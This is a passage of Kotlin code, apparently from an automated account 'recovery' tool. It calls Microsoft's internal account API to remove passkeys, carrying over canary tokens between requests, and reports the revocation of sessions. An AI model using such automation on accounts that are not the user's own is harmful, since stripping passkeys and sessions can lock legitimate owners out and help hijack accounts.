                    activeCanary = removePasskeyData.apiCanary
                }
                if (stageDelayMs > 0) delay(stageDelayMs)
            }
        } else {
            val removePasskeyResponse = client.post("https://account.live.com/API/Proofs/RemovePasskey") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                header("X-Requested-With", "XMLHttpRequest")
                setBody(SecurityCleanupRequest(uaid = uaid))
            }
            val removePasskeyData = runCatching { removePasskeyResponse.body<GenericCanaryResponse>() }.getOrNull()
            if (!removePasskeyData?.apiCanary.isNullOrBlank()) {
                activeCanary = removePasskeyData.apiCanary
            }
        }

        stageListener?.invoke("9", "Cleanup", true, "Sessions revoked")
    }

    private sealed class StageExecution<out T> {
        data class Success<out T>(val value: T) : StageExecution<T>()
        data class Failure(val result: RecoveryResult.Failure) : StageExecution<Nothing>()
    }
}
